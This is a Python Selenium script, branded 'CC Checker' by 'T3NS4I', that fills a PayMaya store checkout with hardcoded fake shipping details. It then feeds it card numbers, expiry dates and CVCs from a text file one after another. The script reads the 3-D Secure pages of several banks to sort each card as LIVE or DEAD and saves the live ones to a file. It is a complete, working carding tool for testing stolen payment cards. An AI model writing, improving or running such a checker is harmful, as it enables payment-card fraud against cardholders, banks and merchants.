import os
import sys
import time

import colorama
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


colorama.init(autoreset=True)
reset = '\033[0m'
fg = [
    '\033[1;91m', # RED
    '\033[1;92m', # GREEN
    '\033[1;93m', # YELLOW
    '\033[1;94m', # BLUE
    '\033[1;95m', # MAGENTA
    '\033[1;96m', # CYAN
    '\033[1;97m', # WHITE
]


class PaymayaCCChecker():
    def __init__(self):
        driver.get('https://store.paymaya.com/4861689925/checkouts/73c3a708b386962493c17b1b3a8b579f')
        driver.find_element_by_id('checkout_email').send_keys('dalisaydeguzman1879@gmail.com')
        driver.find_element_by_id('checkout_shipping_address_first_name').send_keys('Ten')
        driver.find_element_by_id('checkout_shipping_address_last_name').send_keys('Sai')
        driver.find_element_by_id('checkout_shipping_address_address1').send_keys('36A Stracke Fort, Poblacion')
        driver.find_element_by_id('checkout_shipping_address_address2').send_keys('Localhost')
        driver.find_element_by_id('checkout_shipping_address_city').send_keys('Roxas')
        driver.find_element_by_id('checkout_shipping_address_zip').send_keys('5367')
        driver.find_element_by_id('checkout_shipping_address_phone').send_keys('9562917842')
        driver.find_element_by_xpath('//*[@id="continue_button"]').click()
        try:
            driver.find_element_by_id('continue_button').click()
        except:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'checkout_email')))
            driver.find_element_by_id('checkout_email').send_keys('dalisaydeguzman1879@gmail.com')
            driver.find_element_by_id('checkout_shipping_address_first_name').send_keys('Ten')
            driver.find_element_by_id('checkout_shipping_address_last_name').send_keys('Sai')
            driver.find_element_by_id('checkout_shipping_address_address1').send_keys('36A Stracke Fort, Poblacion')
            driver.find_element_by_id('checkout_shipping_address_address2').send_keys('Localhost')
            driver.find_element_by_id('checkout_shipping_address_city').send_keys('Roxas')
            driver.find_element_by_id('checkout_shipping_address_zip').send_keys('5367')
            driver.find_element_by_id('checkout_shipping_address_phone').send_keys('9562917842')
            driver.find_element_by_xpath('//*[@id="continue_button"]').click()
            driver.find_element_by_id('continue_button').click()
        driver.find_element_by_id('continue_button').click()
        for creditcard in open('creditcards.txt').read().splitlines():
            cc_num, cc_month, cc_year, cvc = creditcard.split('|')
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'cardNumber')))
                driver.find_element_by_id('cardNumber').send_keys(cc_num)
            except:
                PaymayaCCChecker()
            driver.find_element_by_xpath('//*[@id="month"]/option[text()="{}"]'.format(cc_month)).click()
            driver.find_element_by_xpath('//*[@id="year"]/option[text()="{}"]'.format(cc_year[2:])).click()
            driver.find_element_by_id('cvc').send_keys(cvc)
            try:
                driver.find_element_by_id('pay').click()
            except:
                pass
            with open('creditcards.txt', 'r') as f:
                lines = f.readlines()
            with open('creditcards.txt', 'w') as f:
                for line in lines:
                    if line.strip('\n') != creditcard:
                        f.write(line)
            time.sleep(5)
            if 'netsafe.hdfcbank.com' in driver.current_url:
                WebDriverWait(driver, 20).until(EC.url_contains('netsafe.hdfcbank.com'))
                if 'Email Id and mobile number not available in our records.' in driver.page_source:
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_class_name('submitotp').click()
                    alert = driver.switch_to.alert
                    alert.accept()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                    WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                    driver.find_element_by_id('continue_button').click()
            elif 'secure5.arcot.com' in driver.current_url:
                WebDriverWait(driver, 20).until(EC.url_contains('secure5.arcot.com'))
                if 'Authentication Failed' in driver.page_source:
                    print('DEAD => {}'.format(creditcard))
                    try:
                        time.sleep(1)
                        driver.find_element_by_id('authsubmit').click()
                    except:
                        pass
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                elif 'Verify this transaction via an OTP' in driver.page_source:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'btncancel')))
                    time.sleep(2)
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_id('btncancel').click()
                    time.sleep(1)
                    driver.find_element_by_id('btnOk').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                elif 'Ditt kort er ikke aktivert for tjenesten Mastercard Identity Check' in driver.page_source:
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_id('continue').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                else:
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    if 'Payment Failed' in driver.page_source:
                        print('DEAD => {}'.format(creditcard))
                    else:
                        print('LIVE => {}'.format(creditcard))
                        open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_class_name('link').click()
                WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                driver.find_element_by_id('continue_button').click()
            elif 'apac.wlp-acs.com' in driver.current_url:
                time.sleep(2)
                if 'payment decline' in driver.page_source.lower():
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'btn_ok')))
                    print('DEAD => {}'.format(creditcard))
                    driver.find_element_by_id('btn_ok').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                elif 'enter the one-time password' in driver.page_source.lower():
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'link_fl_b')))
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_class_name('link_fl_b').click()
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'btn_ok')))
                    driver.find_element_by_id('btn_ok').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                driver.find_element_by_id('continue_button').click()
            elif 'www.acs.bdo.com.ph' in driver.current_url:
                WebDriverWait(driver, 20).until(EC.url_contains('www.acs.bdo.com.ph'))
                if 'One-Time PIN (OTP)' in driver.page_source:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'btnCancel')))
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_id('btnCancel').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                    WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                    driver.find_element_by_id('continue_button').click()
            elif 'acs.bkm.com.tr' in driver.current_url:
                WebDriverWait(driver, 20).until(EC.url_contains('acs.bkm.com.tr'))
                if 'Lütfen şifrenizi giriniz' in driver.page_source:
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                    driver.find_element_by_xpath('//*[@id="t"]/tbody/tr/td/div/table[2]/tbody/tr[2]/td/form/table[4]/tbody/tr[1]/td[2]/input').click()
                    WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                    driver.find_element_by_class_name('link').click()
                    WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                    driver.find_element_by_id('continue_button').click()
            else:
                WebDriverWait(driver, 20).until(EC.url_contains('https://payments.paymaya.com/checkout/result'))
                if 'Payment Failed' in driver.page_source:
                    print('DEAD => {}'.format(creditcard))
                else:
                    print('LIVE => {}'.format(creditcard))
                    open('live_creditcards.txt', 'a+').write('{}\n'.format(creditcard))
                driver.find_element_by_class_name('link').click()
                WebDriverWait(driver, 30).until(EC.url_contains('validate=true'))
                driver.find_element_by_id('continue_button').click()
        driver.close()


"""
İPTAL
"""


if __name__ == '__main__':
    print('''
{0}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{3}                          ██████╗ ██████╗
{0}@@@@@@@@@@@@@@@@@@@H{1}/////{0}#@@@@@@@@@@@@@{3}                         ██╔════╝██╔════╝
{0}@@@@@@@@@@@@@@@@H{1}///////////{0}(@@@@@@@@@@{3}                         ██║     ██║     
{0}@@@@@@@@@H{2}///{0}(@({1}//////////////{0}(@@@@@@@@{3}                         ██║     ██║     
{0}@@@@@@%{2}//////{0}@H{1}/////////////////{0}@@@@@@@{3}                         ╚██████╗╚██████╗
{0}@@@@@{2}////////{0}@({1}//////////////////{0}#@@@@@{3}                          ╚═════╝ ╚═════╝
{0}@@@@{2}/////////{0}@@{1}///////////////////{0}&@@@@
@@@@{2}//////////{0}@@{1}///////////////////{0}@@@@
@@@@{2}///////////{0}@@{1}///////////////////{0}@@@
@@@@({2}///////////{0}(@@({1}////////////////{0}#@@{3}      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
{0}@@@@@{2}//////////////{0}(@@@@{1}/////////////{0}@@{3}     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
{0}@@@@@@{2}///////////////////{0}#&@@@@@@@@@@@@{3}     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
{0}@@@@@@@@{2}////////////////////////{0}@@@@@@@{3}     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
{0}@@@@@@@@@@@{2}//////////////////////{0}@@@@@@{3}     ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
{0}@@@@@@@@@@@@@@@({2}/////////////////{0}(@@@@@{3}      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{0}@@@@@@@@@@@@@@@@@@@@@@@@({2}/////////{0}@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{3}     > By T3NS4I
'''.format(fg[2], fg[1], fg[3], fg[6]))
    try:
        open('creditcards.txt')
    except FileNotFoundError:
        open('creditcards.txt', 'a+')
        print('[!] Please put your BINs/CreditCards in (creditcards.txt)')
        sys.exit()
    if 2 > len(open('creditcards.txt').read().splitlines()):
        print('[!] Please put your BINs/CreditCards in (creditcards.txt)')
        sys.exit()
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    #prefs = {'profile.managed_default_content_settings.images': 2}
    #chrome_options.add_experimental_option('prefs', prefs)
    driver = webdriver.Chrome(options=chrome_options)
    PaymayaCCChecker()
